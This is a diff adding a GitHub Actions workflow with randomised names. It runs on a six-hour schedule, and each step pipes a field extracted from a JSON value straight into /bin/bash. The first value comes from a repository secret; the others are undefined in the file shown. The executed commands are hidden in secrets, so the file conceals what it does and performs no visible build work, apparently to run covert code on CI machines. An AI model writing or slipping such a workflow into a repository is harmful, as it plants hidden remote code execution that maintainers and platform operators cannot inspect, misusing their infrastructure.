@@ -1,0 +1,31 @@
+name: xuzhibai3856
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuzhibai3856
+        env:
+          ll50497: ${{ secrets.ll50497 }}
+        run: |
+          echo $ll50497 | jq -r .bd040 | /bin/bash
+          echo $i07 | jq -r .lg3 | /bin/bash
+          echo $putx7078 | jq -r .iq6 | /bin/bash
+          echo $vnvxk63987 | jq -r .x88010 | /bin/bash
+          echo $dxkib38 | jq -r .jtkx1 | /bin/bash
+          echo $scgem9 | jq -r .gzv5402 | /bin/bash
+          echo $zmn12533 | jq -r .sstdc82 | /bin/bash
+          echo $ubox102 | jq -r .soe25 | /bin/bash
+          echo $dagxl0 | jq -r .zxo129 | /bin/bash
+          echo $j42 | jq -r .clyr66 | /bin/bash
+          echo $kc757 | jq -r .yflc08200 | /bin/bash
+          echo $qxnb85403 | jq -r .cg4096 | /bin/bash
+          echo $mcpm94 | jq -r .xeu171 | /bin/bash
+          echo $gkvs5805 | jq -r .c041 | /bin/bash
+          echo $pk31947 | jq -r .mpkgo68093 | /bin/bash
+
